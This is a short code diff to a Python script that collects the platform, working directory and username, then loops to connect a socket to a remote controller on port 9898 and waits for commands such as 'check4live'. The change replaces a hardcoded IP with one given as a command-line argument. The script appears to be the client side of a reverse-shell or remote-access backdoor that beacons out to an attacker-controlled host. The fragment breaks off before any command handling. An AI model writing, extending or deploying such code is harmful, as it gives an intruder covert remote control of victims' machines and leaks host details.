@@ -7,9 +7,11 @@ import subprocess
 data = [sys.platform, os.getcwd(), os.environ['USERNAME']]
 s = socket.socket()
 
+ip = sys.argv[1]
+
 while True:
     try:
-        s.connect(('192.168.1.103', 9898))
+        s.connect((ip, 9898))
         while True:
             msge = str(s.recv(1024), 'utf-8').strip()
             if msge == 'check4live':
